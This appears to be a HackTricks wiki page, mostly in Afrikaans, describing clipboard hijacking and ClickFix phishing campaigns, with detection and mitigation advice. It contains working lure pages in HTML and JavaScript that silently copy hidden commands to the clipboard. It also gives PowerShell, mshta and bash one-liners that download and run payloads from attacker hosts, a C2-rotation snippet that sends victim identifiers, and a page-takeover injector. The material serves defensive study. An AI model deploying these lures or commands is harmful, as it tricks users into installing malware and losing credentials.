# Clipboard Hijacking (Pastejacking) Aanvalle

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – ou maar steeds geldige raad

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers gereeld opdragte kopieer-en-plak sonder om dit te ondersoek. 'n Kwaadwillige webblad (of enige JavaScript-geskikte konteks soos 'n Electron- of Desktop-toepassing) plaas programmaties aanvaller-beheerde teks in die stelsel-clipboard. Slagoffers word aangemoedig, gewoonlik deur sorgvuldig saamgestelde social-engineering-instruksies, om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) te druk, of 'n terminal oop te maak en die clipboard-inhoud te *paste*, wat onmiddellik arbitrêre opdragte uitvoer.

Omdat **geen lêer afgelaai word en geen aanhangsel oopgemaak word nie**, omseil die tegniek die meeste e-pos en web-inhoud sekuriteitskontroles wat aanhangsels, macros of direkte opdraguitvoering monitor. Die aanval is dus gewild in phishing-campagnes wat commodity malware-families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik; nuweres vertrou op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Die ClickFix / ClearFake-vloei

1. Gebruiker besoek 'n typosquatted of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingespuite **ClearFake** JavaScript roep 'n `unsecuredCopyToClipboard()` helper wat stilweg 'n Base64-gekodeerde PowerShell one-liner in die clipboard stoor.
3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` word uitgevoer en laai 'n argief af wat 'n legitieme uitvoerbare lêer plus 'n kwaadwillige DLL bevat (klassieke DLL sideloading).
5. Die loader ontsleutel addisionele fases, injekteer shellcode en installeer persistensie (bv. scheduled task) – uiteindelik hardloop NetSupport RAT / Latrodectus / Lumma Stealer.

### Voorbeeld NetSupport RAT-ketting
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitieme Java WebStart) deursoek sy gids na `msvcp140.dll`.
* Die kwaadwillige DLL los API's dinamies op met **GetProcAddress**, laai twee binêre lêers (`data_3.bin`, `data_4.bin`) af via **curl.exe**, ontsleutel dit met 'n rollende XOR-sleutel `"https://google.com/"`, injekteer die finale shellcode en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader uit binne **cscript.exe**
3. Haal 'n MSI payload af → drops `libcef.dll` langs 'n signed application → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die **mshta**-oproep lanceer 'n versteekte PowerShell-skrip wat `PartyContinued.exe` aflaai, `Boat.pst` (CAB) onttrek, `AutoIt3.exe` herbou deur middel van `extrac32` en lêer-konkatenasie en uiteindelik 'n `.a3x`-skrip uitvoer wat browser credentials na `sumeriavgv.digital` exfiltrates.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Sommige ClickFix-campagnes slaan lêeraflaaie heeltemal oor en beveel slagoffers aan om 'n one‑liner te plak wat JavaScript via WSH aflaai en uitvoer, dit persistent maak, en C2 daagliks roteer. Voorbeeld van 'n waargenome ketting:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Hoofkenmerke
- Verdoekte URL omgekeer tydens uitvoering om oppervlakkige inspeksie te omseil.
- JavaScript veranker homself via a Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag — wat vinnige domeinrotasie moontlik maak.

Minimale JS-fragment wat gebruik word om C2s volgens datum te roteer:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Die volgende fase ontplooi gewoonlik 'n loader wat persistence vestig en 'n RAT (bv. PureHVNC) aflaai, dikwels TLS aan 'n hardgekodeerde sertifikaat pen en verkeer in stukke verdeel.

Detection ideas specific to this variant
- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Opstart-artefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met 'n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Register/RunMRU en opdragreëltelemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-payloads om lang skripte te voed sonder lang opdragreëls.
- Geskeduleerde take wat daarna LOLBins soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` uitvoer onder 'n opdaterer-agtige taak/pad (bv. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daagliks-roterende C2-hostname en URL's met die `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` patroon.
- Korreleer clipboard-skryfgebeure gevolg deur Win+R-plak en onmiddellike `powershell.exe` uitvoering.

Blue-teams can combine clipboard, process-creation and registry telemetry to pinpoint pastejacking abuse:

* Windows-register: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` berg 'n geskiedenis van **Win + R** opdragte — kyk vir ongewone Base64 / obfuscated inskrywings.
* Sekuriteitsgebeurtenis-ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** vir lêerskeppings onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers net voor die verdagte 4688-gebeurtenis.
* EDR clipboard sensors (indien teenwoordig) – korreleer `Clipboard Write` gevolg onmiddellik deur 'n nuwe PowerShell-proses.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Onlangse veldtogte masseer vals CDN/browser-verifikasiebladsye ("Just a moment…", IUAM-styl) wat gebruikers dwing om OS-spesifieke opdragte uit hul clipboard in native konsoles te plak. Dit skuif uitvoering uit die blaaier‑sandbox en werk oor beide Windows en macOS.

Belangrike kenmerke van die builder‑gegenereerde bladsye
- OS‑opsporing via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD vs. macOS Terminal). Opsionele decoys/no-ops vir nie‑ondersteunde OS om die illusie in stand te hou.
- Outomatiese clipboard-kopie op goedaardige UI‑aksies (checkbox/Copy) terwyl die sigbare teks van die clipboard‑inhoud kan verskil.
- Mobiele blokkering en 'n popover met stap‑vir‑stap instruksies: Windows → Win+R→plak→Enter; macOS → maak Terminal oop→plak→Enter.
- Opsionele obfuskasie en single-file injector om 'n gekompromitteerde webwerf se DOM met 'n Tailwind-gestileerde verifikasie‑UI te oorskryf (geen nuwe domeinregistrasie vereis nie).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence van die aanvanklike run
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat die uitvoering voortgaan nadat die terminal gesluit is, en sodoende sigbare artefakte verminder.

In-place page takeover op gekompromitteerde sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web: Bladsye wat Clipboard API bind aan verifikasie-widgets; ongelykheid tussen vertoonde teks en clipboard payload; `navigator.userAgent` branching; Tailwind + single-page vervanging in verdagte kontekste.
- Windows-endpunt: `explorer.exe` → `powershell.exe`/`cmd.exe` kort daarna na 'n blaaierinteraksie; batch/MSI-installeerders uitgevoer vanaf `%TEMP%`.
- macOS-endpunt: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` skep naby blaaiergebeurtenisse; agtergrondtake wat voortbestaan nadat die terminal toegemaak is.
- Korreleer `RunMRU` (Win+R) geskiedenis en clipboard-skrifte met die daaropvolgende skepping van konsoleprosesse.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigerings

1. Blaaierhardering – deaktiveer clipboard write-access (`dom.events.asyncClipboard.clipboardItem` ens.) of vereis 'n gebruikersgebaar.
2. Sekuriteitsbewustheid – leer gebruikers om *te tik* sensitiewe opdragte of eers in 'n teksredigeerder te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitêre one-liners te blokkeer.
4. Netwerkbeheer – blokkeer uitgaande versoeke na bekende pastejacking- en malware C2-domeine.

## Related Tricks

* **Discord Invite Hijacking** often abuses the same ClickFix approach after luring users into a malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Verwysings

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
